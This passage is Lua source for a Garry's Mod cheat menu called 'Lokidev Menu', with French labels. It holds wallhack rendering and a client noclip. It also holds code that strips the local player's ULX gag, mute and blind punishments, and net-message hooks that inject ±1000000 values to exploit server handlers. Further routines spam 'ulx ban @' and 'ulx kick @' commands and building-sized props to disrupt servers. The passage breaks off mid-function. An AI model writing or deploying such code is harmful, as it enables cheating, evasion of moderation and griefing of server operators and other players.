if IsValid(v) then
cam.Start3D(EyePos(), EyeAngles())
v:SetMaterial("models/debug/debugwhite")
v:SetColor(Color(255, 0, 0, 255))
render.MaterialOverride("models/debug/debugwhite")
render.SuppressEngineLighting( false )
render.SetBlend( 0.3 )
render.SetColorModulation( 1, 0, 0 )
v:DrawModel()
cam.End3D()
local p = v:GetOwner()
local ESP = (v:EyePos()):ToScreen()
local col = v:GetPlayerColor()
col = Color(255, 0, 0)
local x1,y1,x2,y2 = coordinates(v)
if IsValid(p) then
else
surface.SetDrawColor(col)
end
draw.DrawText("COUTEAU", "s1", ESP.x, ESP.y, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
end
for k, v in pairs(ents.FindByClass("weapon_mu_magnum")) do
if IsValid(v) then
cam.Start3D(EyePos(), EyeAngles())
v:SetMaterial("models/debug/debugwhite")
v:SetColor(Color(0, 0, 255, 255))
render.MaterialOverride("models/debug/debugwhite")
render.SuppressEngineLighting( false )
render.SetBlend( 0.3 )
render.SetColorModulation( 0, 0, 1 )
v:DrawModel()
cam.End3D()
local p = v:GetOwner()
local ESP = (v:EyePos()):ToScreen()
local col = v:GetPlayerColor()
col = Color(0, 0, 255)
local x1,y1,x2,y2 = coordinates(v)
if IsValid(p) then
else
surface.SetDrawColor(col)
end
draw.DrawText("PISTOLET", "s1", ESP.x, ESP.y, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
end
for k, v in pairs(ents.FindByClass("mu_magnum")) do
if IsValid(v) then
cam.Start3D(EyePos(), EyeAngles())
v:SetMaterial("models/debug/debugwhite")
v:SetColor(Color(0, 0, 255, 255))
render.MaterialOverride("models/debug/debugwhite")
render.SuppressEngineLighting( false )
render.SetBlend( 0.3 )
render.SetColorModulation( 0, 0, 1 )
v:DrawModel()
cam.End3D()
local p = v:GetOwner()
local ESP = (v:EyePos()):ToScreen()
local col = v:GetPlayerColor()
col = Color(0, 0, 255)
local x1,y1,x2,y2 = coordinates(v)
if IsValid(p) then
else
surface.SetDrawColor(col)
end
draw.DrawText("PISTOLET", "s1", ESP.x, ESP.y, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
end
end
end)
function ULXgotOwned()         
if LocalPlayer():GetNWBool("EV_Blinded") then      
LocalPlayer():SetNWBool("EV_Blinded", false)       
end      
hook.Remove( "HUDPaint", "ulx_blind" )   
timer.Destroy("GagLocalPlayer")      
hook.Remove("PlayerBindPress", "ULXGagForce")      
if LocalPlayer():GetNWBool("ulx_gagged") then      
LocalPlayer():SetNWBool("ulx_gagged", false)     
end      
hook.Remove( "PlayerCanHearPlayersVoice", "ULXGag" )     
if( ulx && ulx.gagUser ) then      
ulx.gagUser(LocalPlayer(),false)         
end              
if LocalPlayer():GetNWBool("Muted") then      
LocalPlayer():SetNWBool("Muted", false)       
end             
if LocalPlayer():GetNWBool("ulx_muted") then      
LocalPlayer():SetNWBool("ulx_muted", false)   
end        
end      
hook.Add("Think", "ULXDansTonCUL", ULXgotOwned)
ZNX.WraithVision = false
function ZNX.ToggleWraithVision()
local mapmaterials = Entity( 0 ):GetMaterials()
for k, v in pairs( mapmaterials ) do
local m = Material( v )
if !ZNX.WraithVision then m:SetFloat( "$alpha", 0.75 ) else m:SetFloat( "$alpha", 1 ) end
end
ZNX.WraithVision = !ZNX.WraithVision
end
concommand.Add( "LokiDev_wraith_vision", ZNX.ToggleWraithVision )
if (not file.Exists("Lokidev_DarkRP/Logger/Netcodelogger.txt", "Data"))
then file.Write("Lokidev_DarkRP/Logger/Netcodelogger.txt", "")
end
if !lognetmsg then    
lognetmsg = {}          
lognetmsg.NetStart = net.Start        
lognetmsg.NetWriteDouble = net.WriteDouble
lognetmsg.NetWriteFloat = net.WriteFloat
lognetmsg.NetWriteString = net.WriteString
lognetmsg.NetWriteInt = net.WriteInt
end
function net.Start(mercipourlesnetcode)
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.Start( "..mercipourlesnetcode.." ) \n")     
return lognetmsg.NetStart(mercipourlesnetcode)      
end   
function net.WriteDouble(mercipourlesnetcode)
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteDouble( "..mercipourlesnetcode.." ) \n")     
return lognetmsg.NetWriteDouble(mercipourlesnetcode)      
end   
function net.WriteFloat(mercipourlesnetcode)
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteFloat( "..mercipourlesnetcode.." ) \n")    
return lognetmsg.NetWriteFloat(mercipourlesnetcode)      
end   
function net.WriteString(mercipourlesnetcode)
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteString( "..mercipourlesnetcode.." ) \n")   
return lognetmsg.NetWriteString(mercipourlesnetcode)      
end   
function net.WriteInt(mercipourlesnetcode, chuckzjtm)
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteInt( "..mercipourlesnetcode..", "..chuckzjtm.." ) \n")
return lognetmsg.NetWriteInt(mercipourlesnetcode, chuckzjtm)      
end   
function AutoNetExploit ()
if !autonet then
autonet = " Positif"
statutautoexploit = "Positif"
function net.Start(mercipourlesnetcode)
print("net.Start( "..mercipourlesnetcode.." )")
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.Start( "..mercipourlesnetcode.." ) \n")     
return lognetmsg.NetStart(mercipourlesnetcode)      
end   
function net.WriteDouble(mercipourlesnetcode)
print("net.WriteDouble( 1000000 )")
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteDouble( "..mercipourlesnetcode.." ) \n")  
return lognetmsg.NetWriteDouble(1000000)      
end   
function net.WriteFloat(mercipourlesnetcode)
print("net.WriteFloat( 1000000 )")
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteFloat( "..mercipourlesnetcode.." ) \n")    
return lognetmsg.NetWriteFloat(1000000)      
end   
function net.WriteString(mercipourlesnetcode)
print("net.WriteString( 1000000 )")
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteString( "..mercipourlesnetcode.." ) \n")  
return lognetmsg.NetWriteString(1000000)      
end   
function net.WriteInt(mercipourlesnetcode, chuckzjtm)
print("net.WriteInt( 1000000, "..chuckzjtm.." )")
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteInt( "..mercipourlesnetcode..", "..chuckzjtm.." ) \n")
return lognetmsg.NetWriteInt(1000000, chuckzjtm)      
end   
elseif autonet==" Positif" then
autonet = " Negatif"
statutautoexploit = "Négatif"
function net.Start(mercipourlesnetcode)  
print("net.Start( "..mercipourlesnetcode.." )")
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.Start( "..mercipourlesnetcode.." ) \n")     
return lognetmsg.NetStart(mercipourlesnetcode)      
end   
function net.WriteDouble(mercipourlesnetcode)
print("net.WriteDouble( -1000000 )")
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteDouble( "..mercipourlesnetcode.." ) \n")  
return lognetmsg.NetWriteDouble(-1000000)      
end   
function net.WriteFloat(mercipourlesnetcode)
print("net.WriteFloat( -1000000 )")
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteFloat( "..mercipourlesnetcode.." ) \n")    
return lognetmsg.NetWriteFloat(-1000000)      
end   
function net.WriteString(mercipourlesnetcode)
print("net.WriteString( -1000000 )")
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteString( "..mercipourlesnetcode.." ) \n")   
return lognetmsg.NetWriteString(-1000000)      
end   
function net.WriteInt(mercipourlesnetcode, chuckzjtm)
print("net.WriteInt( -1000000, "..chuckzjtm.." )")
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteInt( "..mercipourlesnetcode..", "..chuckzjtm.." ) \n")
return lognetmsg.NetWriteInt(-1000000, chuckzjtm)      
end   
elseif autonet then
autonet = false
statutautoexploit = "Désactiver"    
function net.Start(mercipourlesnetcode)
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.Start( "..mercipourlesnetcode.." ) \n")     
return lognetmsg.NetStart(mercipourlesnetcode)      
end   
function net.WriteDouble(mercipourlesnetcode)
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteDouble( "..mercipourlesnetcode.." ) \n")     
return lognetmsg.NetWriteDouble(mercipourlesnetcode)      
end   
function net.WriteFloat(mercipourlesnetcode)
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteFloat( "..mercipourlesnetcode.." ) \n")    
return lognetmsg.NetWriteFloat(mercipourlesnetcode)      
end   
function net.WriteString(mercipourlesnetcode)
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteString( "..mercipourlesnetcode.." ) \n")   
return lognetmsg.NetWriteString(mercipourlesnetcode)      
end   
function net.WriteInt(mercipourlesnetcode, chuckzjtm)
file.Append("Lokidev_DarkRP/Logger/Netcodelogger.txt", "net.WriteInt( "..mercipourlesnetcode..", "..chuckzjtm.." ) \n")
return lognetmsg.NetWriteInt(mercipourlesnetcode, chuckzjtm)      
end   
end
end
ZNX.Enabled = false
ZNX.ViewOrigin = Vector( 0, 0, 0 )
ZNX.ViewAngle = Angle( 0, 0, 0 )
ZNX.Velocity = Vector( 0, 0, 0 )
function ZNX.CalcView( ply, origin, angles, fov )
if ( !ZNX.Enabled ) then return end
if ( ZNX.SetView ) then
ZNX.ViewOrigin = origin
ZNX.ViewAngle = angles
ZNX.SetView = false
end
return { origin = ZNX.ViewOrigin, angles = ZNX.ViewAngle }
end
hook.Add( "CalcView", "MonsterBot-Noclip", ZNX.CalcView )
function ZNX.CreateMove( cmd )
if ( !ZNX.Enabled ) then return end
// Add and reduce the old velocity.
local time = FrameTime()
ZNX.ViewOrigin = ZNX.ViewOrigin + ( ZNX.Velocity * time )
ZNX.Velocity = ZNX.Velocity * 0.93
// Rotate the view when the mouse is moved.
local sensitivity = 0.022
ZNX.ViewAngle.p = math.Clamp( ZNX.ViewAngle.p + ( cmd:GetMouseY() * sensitivity ), -89, 89 )
ZNX.ViewAngle.y = ZNX.ViewAngle.y + ( cmd:GetMouseX() * -1 * sensitivity )
// What direction were going to move in.
local add = Vector( 0, 0, 0 )
local ang = ZNX.ViewAngle
if ( cmd:KeyDown( IN_FORWARD ) ) then add = add + ang:Forward() end
if ( cmd:KeyDown( IN_BACK ) ) then add = add - ang:Forward() end
if ( cmd:KeyDown( IN_MOVERIGHT ) ) then add = add + ang:Right() end
if ( cmd:KeyDown( IN_MOVELEFT ) ) then add = add - ang:Right() end
if ( cmd:KeyDown( IN_JUMP ) ) then add = add + ang:Up() end
if ( cmd:KeyDown( IN_DUCK ) ) then add = add - ang:Up() end
// Speed.
add = add:GetNormal() * time * 900
if ( cmd:KeyDown( IN_SPEED ) ) then add = add * 15 end
ZNX.Velocity = ZNX.Velocity + add
// This stops us looking around crazily while spiritwalking.
if ( ZNX.LockView == true ) then
ZNX.LockView = cmd:GetViewAngles()
end
if ( ZNX.LockView ) then
cmd:SetViewAngles( ZNX.LockView )
end
// This stops us moving while spiritwalking.
cmd:SetForwardMove( 0 )
cmd:SetSideMove( 0 )
cmd:SetUpMove( 0 )
end
hook.Add( "CreateMove", "MonsterBotNoclip", ZNX.CreateMove )
function ZNX.Toggle()
ZNX.Enabled = !ZNX.Enabled
ZNX.LockView = ZNX.Enabled
ZNX.SetView = true
local status = { [ true ] = "ON", [ false ] = "OFF" }
ChatPrint("ClientSide NoClip " .. status[ ZNX.Enabled ] )
end
CreateClientConVar("LokiDev_stopfalldmg_prop",  "models/props_trainstation/trainstation_post001.mdl")
local toggler = 0
local ang
local view = {}
local function falldamage()
hook.Add("CreateMove", "anti-falldmg", function(cmd)
ang = cmd:GetViewAngles()
if toggler == 0 then
oriang = ang
toggler = 1
hook.Add("CalcView", "FlyCam", function(ply, ori, ang, fov, nz, fz)
view.origin = ori
view.angles = Angle(30, ang.yaw,0)
view.fov = fov
return view 
end)
end
cmd:SetViewAngles(Angle(90, ang.yaw, 0))
local trace = LocalPlayer():GetEyeTrace()
if trace.HitWorld then
if LocalPlayer():GetPos():Distance(trace.HitPos) < 25 then
hook.Remove("CreateMove", "anti-falldmg")
RunConsoleCommand("gm_spawn", GetConVarString("LokiDev_stopfalldmg_prop"))
view.angles = view.angles or Angle(30, ang.yaw, 0)
cmd:SetViewAngles(view.angles)
hook.Remove("CalcView", "FlyCam")
toggler = 0
timer.Simple(.1, function()
RunConsoleCommand("undo")
end)
end
end
end)
end
if ZNX.Vars.SafeJump then
local keyjum = ZNX.NumberVars.SafeJumpBindKey
if ( input.IsKeyDown( keyjum ) or input.IsMouseDown( keyjum ) ) then
falldamage()
return 
end
end
concommand.Add("LokiDev_stopfalldmg", falldamage)
function ShowLokidevInfo ()
local InfoFrame = vgui.Create( "DFrame" ) 
InfoFrame:SetPos( 50, 50 ) 
InfoFrame:SetSize( ScrW()-100,ScrH()-100 ) 
InfoFrame:SetTitle( " " )
InfoFrame:SetVisible( true )
InfoFrame:SetDraggable( true ) 
InfoFrame:ShowCloseButton( false ) 
InfoFrame.Paint = function ()
DrawRoundedBox ( 0, 0, 0, InfoFrame:GetWide(), InfoFrame:GetTall(), Color(255, 0, 0																					 ,255) )
DrawOutlinedText ( "Lokidev Menu Version 1.7", "Infotab", InfoFrame:GetWide()/2, 35, red, 2, black )
DrawRoundedBoxEx ( 0, 0, 75, InfoFrame:GetWide(), 25, Color(255,0,0,255), true, true, true, true )
DrawLine ( 255, 0, 0, 255 )
DrawOutlinedText ( "Commandes", "Logo", InfoFrame:GetWide()/2-60, 87, blue, 1, red )
DrawOutlinedText ( "Information", "Logo", InfoFrame:GetWide()/2+160, 87, red, 1, black )
DrawOutlinedText ( "LokiDevs_Menu", "Menu", InfoFrame:GetWide()/2-60, 110, red, 1, black )
DrawOutlinedText ( "LokiDev_who", "Menu", InfoFrame:GetWide()/2-60, 130, red, 1, black )
DrawOutlinedText ( "fgtnoafk", "Menu", InfoFrame:GetWide()/2-60, 150, red, 1, black )
DrawOutlinedText ( "LokiDev_ents", "Menu", InfoFrame:GetWide()/2-60, 170, red, 1, black )
DrawOutlinedText ( "LokiDev_players", "Menu", InfoFrame:GetWide()/2-60, 190, red, 1, black )
DrawOutlinedText ( "LokiDev_stopfalldmg", "Menu", InfoFrame:GetWide()/2-60, 210, red, 1, black )
DrawOutlinedText ( "LokiDev_pk_tubelaunch", "Menu", InfoFrame:GetWide()/2-60, 230, red, 1, black )
DrawOutlinedText ( "LokiDev_climbswep", "Menu", InfoFrame:GetWide()/2-60, 250, red, 1, black )
DrawOutlinedText ( "LokiDev_inspectweapon", "Menu", InfoFrame:GetWide()/2-60, 270, red, 1, black )
DrawOutlinedText ( "LokiDev_dumpnwstrings", "Menu", InfoFrame:GetWide()/2-60, 290, red, 1, black )
DrawOutlinedText ( "LokiDev_dumphooks", "Menu", InfoFrame:GetWide()/2-60, 310, red, 1, black )
DrawOutlinedText ( "LokiDev_dumpcommands", "Menu", InfoFrame:GetWide()/2-60, 330, red, 1, black )
DrawOutlinedText ( "LokiDev_random_rp_job", "Menu", InfoFrame:GetWide()/2-60, 350, red, 1, black )
DrawOutlinedText ( "", "Menu", InfoFrame:GetWide()/2-60, 370, red, 1, black )
DrawOutlinedText ( "", "Menu", InfoFrame:GetWide()/2-60, 390, red, 1, black )
DrawOutlinedText ( "", "Menu", InfoFrame:GetWide()/2-60, 410, red, 1, black )
DrawOutlinedText2 ( "Ouvrir le ModMenu", "Menu", InfoFrame:GetWide()/2+100, 110, red, 1, black )
DrawOutlinedText2 ( "Info sur les joueurs", "Menu", InfoFrame:GetWide()/2+100, 130, red, 1, black )
DrawOutlinedText2 ( "Anti Afk Script", "Menu", InfoFrame:GetWide()/2+100, 150, red, 1, black )
DrawOutlinedText2 ( "Ouvrir l'Entité Menu", "Menu", InfoFrame:GetWide()/2+100, 170, red, 1, black )
DrawOutlinedText2 ( "Ouvrir le Menu des Joueurs", "Menu", InfoFrame:GetWide()/2+100, 190, red, 1, black )
DrawOutlinedText2 ( "Enleve les dégats de chute (le mieux c'est de bind la commande !)", "Menu", InfoFrame:GetWide()/2+100, 210, red, 1, black )
DrawOutlinedText2 ( "Lancer un Tube (PropsKill ^^)", "Menu", InfoFrame:GetWide()/2+100, 230, red, 1, black )
DrawOutlinedText2 ( "Assistance pour le Climb Swep", "Menu", InfoFrame:GetWide()/2+100, 250, red, 1, black )
DrawOutlinedText2 ( "Information sur votre arme", "Menu", InfoFrame:GetWide()/2+100, 270, red, 1, black )
DrawOutlinedText2 ( "Affiche tous les net code du serveur dans la console", "Menu", InfoFrame:GetWide()/2+100, 290, red, 1, black )
DrawOutlinedText2 ( "Affiche tous les Hooks du serveur dans la console", "Menu", InfoFrame:GetWide()/2+100, 310, red, 1, black )
DrawOutlinedText2 ( "Affiche toutes les Commandes du serveur dans la console", "Menu", InfoFrame:GetWide()/2+100, 330, red, 1, black )
DrawOutlinedText2 ( "Vous mes un Métiers aleatoire (darkrp/prisonrp seulement)", "Menu", InfoFrame:GetWide()/2+100, 350, red, 1, black )
DrawOutlinedText2 ( "", "Menu", InfoFrame:GetWide()/2+100, 370, red, 1, black )
DrawOutlinedText2 ( "", "Menu", InfoFrame:GetWide()/2+100, 390, red, 1, black )
DrawOutlinedText2 ( "", "Menu", InfoFrame:GetWide()/2+100, 410, red, 1, black )
InfoFrame:MakePopup()
end
CreateButton  ( "X", InfoFrame, black, Color(255,0,0,225), true, InfoFrame:GetWide()-50, -30, 50, 50, "Close", function () InfoFrame:Close() end )
end
function Animation()
if !animating then
animating = "flex"
animatinginfo = "Flex"
timer.Create("animating", 2, 0, function() RunConsoleCommand("_DarkRP_DoAnimation", "1616") end)
elseif animating=="flex" then
animating = "muscle"
animatinginfo = "Muscle"
timer.Destroy("animating")
timer.Create("animating", 2, 0, function() RunConsoleCommand("_DarkRP_DoAnimation", "1617") end)
elseif animating=="muscle" then
animating = "reverence"
animatinginfo = "Révérence"
timer.Destroy("animating")
timer.Create("animating", 2, 0, function() RunConsoleCommand("_DarkRP_DoAnimation", "1612") end)
elseif animating=="reverence" then
animating = "vient"
animatinginfo = "Vient"
timer.Destroy("animating")
timer.Create("animating", 2, 0, function() RunConsoleCommand("_DarkRP_DoAnimation", "1611") end)
elseif animating=="vient" then
animating = "rire"
animatinginfo = "Rire"
timer.Destroy("animating")
timer.Create("animating", 2, 0, function() RunConsoleCommand("_DarkRP_DoAnimation", "1618") end)
elseif animating=="rire" then
animating = "non"
animatinginfo = "Non"
timer.Destroy("animating")
timer.Create("animating", 2, 0, function() RunConsoleCommand("_DarkRP_DoAnimation", "1613") end)
elseif animating=="non" then
animating = "victoire"
animatinginfo = "Victoire"
timer.Destroy("animating")
timer.Create("animating", 2, 0, function() RunConsoleCommand("_DarkRP_DoAnimation", "1610") end)
elseif animating=="victoire" then
animating = "coucou"
animatinginfo = "Coucou"
timer.Destroy("animating")
timer.Create("animating", 2, 0, function() RunConsoleCommand("_DarkRP_DoAnimation", "1615") end)
elseif animating=="coucou" then
animating = false
animatinginfo = "Désactiver" 
timer.Destroy("animating")
end
end
function ULXspam ()
if !ulxspam then
ulxspam = "Slay"
info_ulx_spam = "Slay"
timer.Create("ulxspam", 0.4, 0, function() ply:ConCommand("ulx slay @") end)
elseif ulxspam=="Slay" then
ulxspam = "Ignite"
info_ulx_spam = "Ignite"
timer.Destroy("ulxspam")
timer.Create("ulxspam", 0.4, 0, function() ply:ConCommand("ulx ignite @") end)
elseif ulxspam=="Ignite" then
ulxspam = "Maul"
info_ulx_spam = "Maul"
timer.Destroy("ulxspam")
timer.Create("ulxspam", 0.4, 0, function() ply:ConCommand("ulx maul @") end)
elseif ulxspam=="Maul" then
ulxspam = "Ragdoll"
info_ulx_spam = "Ragdoll"
timer.Destroy("ulxspam")
timer.Create("ulxspam", 0.4, 0, function() ply:ConCommand("ulx ragdoll @") end)
elseif ulxspam=="Ragdoll" then
ulxspam = "Whip"
info_ulx_spam = "Whip"
timer.Destroy("ulxspam")
timer.Create("ulxspam", 0.4, 0, function() ply:ConCommand("ulx whip @ 100") end)
elseif ulxspam=="Whip" then
ulxspam = "Sound"
info_ulx_spam = "Sound"
timer.Destroy("ulxspam")
timer.Create("ulxspam", 3, 0, function() ply:ConCommand("ulx playsound earthquake.mp3") end)
elseif ulxspam=="Sound" then
ulxspam = "Kick"
info_ulx_spam = "Kick"
timer.Destroy("ulxspam")
timer.Create("ulxspam", 0.4, 0, function() ply:ConCommand("ulx kick @ 0 Go apprendre a proteger votre serv les enfants x)") end)
elseif ulxspam=="Kick" then
ulxspam = "Ban"
info_ulx_spam = "Ban"
timer.Destroy("ulxspam")
timer.Create("ulxspam", 0.4, 0, function() ply:ConCommand("ulx ban @ 0 Go apprendre a proteger votre serv les enfants x)") end)
elseif ulxspam then
ulxspam = false
info_ulx_spam = "Désactiver"      
timer.Destroy("ulxspam")
end
end
function PropSpam()
if !propspam then
propspam = "Vitesse 1"
spam_props_text = "Vitesse 1"
timer.Create("propspam", 3.50, 0, function() ply:ConCommand("gm_spawn models/props_phx/wheels/metal_wheel2.mdl") end)
timer.Create("propspam1", 2.00, 0, function() ply:ConCommand("gm_spawn models/props_phx/wheels/metal_wheel1.mdl") end)
elseif propspam=="Vitesse 1" then
propspam = "Vitesse 2"
spam_props_text = "Vitesse 2"
timer.Destroy("propspam")
timer.Destroy("propspam1")
timer.Create("propspam", 2.80, 0, function() ply:ConCommand("gm_spawn models/props_phx/wheels/metal_wheel2.mdl") end)
timer.Create("propspam1", 1.20, 0, function() ply:ConCommand("gm_spawn models/props_phx/wheels/metal_wheel1.mdl") end)
elseif propspam=="Vitesse 2" then
propspam = "Vitesse 3"
spam_props_text = "Vitesse 3"
timer.Destroy("propspam")
timer.Destroy("propspam1")
timer.Create("propspam", 0.88, 0, function() ply:ConCommand("gm_spawn models/props_phx/wheels/metal_wheel2.mdl") end)
timer.Create("propspam1", 0.42, 0, function() ply:ConCommand("gm_spawn models/props_phx/wheels/metal_wheel1.mdl") end)
elseif propspam=="Vitesse 3" then
propspam = "Mega Spam"
spam_props_text = "Big-Spam"
timer.Destroy("propspam")
timer.Destroy("propspam1")
timer.Create("propspam", 0.4, 0, function() 
ply:ConCommand("gm_spawn models/props_buildings/building_002a.mdl") 
ply:ConCommand("gm_spawn models/props_buildings/collapsedbuilding01a.mdl") 
ply:ConCommand("gm_spawn models/props_buildings/project_building01.mdl") 
ply:ConCommand("gm_spawn models/props_buildings/row_church_fullscale.mdl") 
ply:ConCommand("gm_spawn models/props_buildings/project_destroyedbuildings01.mdl") 
ply:ConCommand("gm_spawn models/props_buildings/watertower_002a.mdl") 
ply:ConCommand("models/props_buildings/project_destroyedbuildings01.mdl") 
ply:ConCommand("models/props_wasteland/bridge_side03-other.mdl") 
ply:ConCommand("models/props_wasteland/bridge_side03.mdl") 
ply:ConCommand("models/props_wasteland/rockgranite04c.mdl") 
ply:ConCommand("models/props_docks/prefab_piling01a.mdl") 
ply:ConCommand("models/props_c17/overpass_001b.mdl") 
ply:ConCommand("models/props_c17/overpass_001a.mdl") 
ply:ConCommand("models/props_c17/overhaingcluster_001a.mdl") 
ply:ConCommand("models/props_wasteland/tugtop001.mdl") 
ply:ConCommand("models/props_wasteland/tugtop002.mdl") 
end)
elseif propspam then
propspam = false
superspamingTabCol = red
spam_props_text = "Désactiver"     
timer.Destroy("propspam")
end
end
function Moneyssuperspam()
if !moneyspam then
moneyspam = "Drop"
billet_spam = "Drop 1€"
timer.Create("moneyspam", 0.1, 0, function() RunConsoleCommand( "say", "/moneydrop 1") end)
elseif moneyspam=="Drop" then
moneyspam = "Give1euro"
billet_spam = "Give 1€"
timer.Create("moneyspam", 0.1, 0, function() RunConsoleCommand( "say", "/give 1") end)
elseif moneyspam=="Give1euro" then
moneyspam = "Dropmillion"
billet_spam = "Drop 1 Million"
timer.Destroy("moneyspam")
timer.Create("moneyspam", 0.1, 0, function() RunConsoleCommand( "say", "/moneydrop 1000000") end)
elseif moneyspam=="Dropmillion" then
moneyspam = "Givemillion"
billet_spam = "Give 1 Million"
timer.Destroy("moneyspam")
timer.Create("moneyspam", 0.1, 0, function() RunConsoleCommand( "say", "/give 1000000") end)
elseif moneyspam=="Givemillion" then
moneyspam = "Dropmax"
billet_spam = "Drop 1 Milliard"
timer.Destroy("moneyspam")
timer.Create("moneyspam", 0.1, 0, function() RunConsoleCommand( "say", "/moneydrop 1000000000") end)
elseif moneyspam=="Dropmax" then
moneyspam = "Give"
billet_spam = "Give 1 Milliard"
timer.Destroy("moneyspam")
timer.Create("moneyspam", 0.1, 0, function() RunConsoleCommand( "say", "/give 1000000000") end)
elseif moneyspam then
moneyspam = false
billet_spam = "Désactiver"      
timer.Destroy("moneyspam")
end
end 
local removes = {"env_steam",
"func_illusionary",
"beam",
"class C_BaseEntity",
"env_sprite",
"class C_ShadowControl",
"class C_ClientRagdoll",
"func_illusionary",
"class C_PhysPropClientside",
}
function StopLAG()
if !stoplag then
stoplag = "Activer"
RunConsoleCommand("r_3dsky", 0)
RunConsoleCommand("r_WaterDrawReflection", 0)
RunConsoleCommand("r_waterforcereflectentities", 0)
RunConsoleCommand("r_teeth", 0)
RunConsoleCommand("r_shadows", 0)
RunConsoleCommand("r_ropetranslucent", 0)
RunConsoleCommand("r_maxmodeldecal", 0) --50
RunConsoleCommand("r_maxdlights", 0)--32
RunConsoleCommand("r_decals", 0)--2048
RunConsoleCommand("r_drawmodeldecals", 0)
RunConsoleCommand("r_drawdetailprops", 0)
RunConsoleCommand("r_worldlights", 0)
RunConsoleCommand("r_flashlightrender", 0)
RunConsoleCommand("cl_forcepreload", 1)
RunConsoleCommand("r_threaded_renderables", 1)
RunConsoleCommand("r_threaded_client_shadow_manager", 1)
RunConsoleCommand("snd_mix_async", 1)
RunConsoleCommand("cl_ejectbrass", 0)
RunConsoleCommand("cl_detaildist", 0)
RunConsoleCommand("cl_show_splashes", 0)
RunConsoleCommand("gmod_mcore_test", 1)
RunConsoleCommand("mat_filterlightmaps", 0)
RunConsoleCommand("mat_queue_mode", -1)
RunConsoleCommand("r_drawflecks", 0)
RunConsoleCommand("r_dynamic", 0)
RunConsoleCommand("r_WaterDrawRefraction", 0)
RunConsoleCommand("cl_threaded_bone_setup", 1)
ZNX.ChatText( "FPS Booster Activer", Color(255,205,205))
for k,v in pairs(removes) do
for a,b in pairs(ents.FindByClass(v)) do
b:SetNoDraw(true)
end
end
elseif stoplag then
stoplag = false
RunConsoleCommand("r_3dsky", 0)
RunConsoleCommand("r_WaterDrawReflection", 1)
RunConsoleCommand("r_waterforcereflectentities", 1)
RunConsoleCommand("r_teeth", 1)
RunConsoleCommand("r_shadows", 1)
RunConsoleCommand("r_ropetranslucent", 1)
RunConsoleCommand("r_maxmodeldecal", 50) --50
RunConsoleCommand("r_maxdlights", 32)--32
RunConsoleCommand("r_decals", 2048)--2048
RunConsoleCommand("r_drawmodeldecals", 1)
RunConsoleCommand("r_drawdetailprops", 1)
RunConsoleCommand("r_decal_cullsize", 1000)
RunConsoleCommand("r_worldlights", 1)
RunConsoleCommand("r_flashlightrender", 1)
RunConsoleCommand("cl_forcepreload", 0)
RunConsoleCommand("cl_ejectbrass", 1)
RunConsoleCommand("cl_show_splashes", 1)
RunConsoleCommand("cl_detaildist", 1200)
RunConsoleCommand("gmod_mcore_test", 1)
RunConsoleCommand("mat_filterlightmaps", 1)
RunConsoleCommand("r_threaded_renderables", 0)
RunConsoleCommand("r_threaded_client_shadow_manager", 0)
RunConsoleCommand("mat_queue_mode", -1)
RunConsoleCommand("r_drawflecks", 1)
RunConsoleCommand("r_WaterDrawRefraction", 1)
RunConsoleCommand("cl_threaded_bone_setup", 1)
RunConsoleCommand("r_dynamic", 1)
ZNX.ChatText( "FPS Booster Désactiver", Color(255,205,205))
for k,v in pairs(removes) do
for a,b in pairs(ents.FindByClass(v)) do
b:SetNoDraw(false)
end
end
end
end 
function physicgunspeed ()
if !physicspeed then
physicspeed = true
RunConsoleCommand("physgun_wheelspeed", 9999)
ChatPrint("Vitesse du Physic-Gun: 9999")
elseif physicspeed then
physicspeed = false
RunConsoleCommand("physgun_wheelspeed", 10)
ChatPrint("Vitesse du Physic-Gun: 10")
end
end
function umsghook(ucmd)
if ZNX.Vars.AutoReload then
local wep = LocalPlayer():GetActiveWeapon()
if (LocalPlayer():Alive() and IsValid(wep)) then
if (wep:Clip1() <= 1 and wep:GetMaxClip1() > 0 and !table.HasValue(shitweapons, LocalPlayer():GetActiveWeapon():GetClass()) and CurTime() > wep:GetNextPrimaryFire()) then
ucmd:SetButtons(ucmd:GetButtons() + IN_RELOAD)
end
end
end
if( ZNX.Vars.Autoclick and !ZNX.Vars.RopeStorm and !ZNX.Vars.Triggerbot and !ZNX.Vars.AutoShoot) then
local Wep = LocalPlayer():GetActiveWeapon()
if (LocalPlayer():Alive() and IsValid(Wep)) then
if ZNX.Vars.AutoReload then maxclipsizaautoreload = 1 else maxclipsizaautoreload = 0 end
if Wep:GetMaxClip1() > 0 and Wep:Clip1() > maxclipsizaautoreload then
if (input.IsMouseDown(MOUSE_LEFT)) then
if (Wep:GetNextPrimaryFire() >= CurTime()) then
ucmd:RemoveKey(IN_ATTACK)
end
end
end
end
end
end
hook.Add("CreateMove","Reload",umsghook)
function ExecuteCmd( contents )
RunString( contents )
end
-- A Jour :

timer.Create("timerversionchecker",10,1,function()
hook.Remove("HUDPaint", "HudVersionChecker")
end)
hook.Add("HUDPaint", "HudVersionChecker", function()
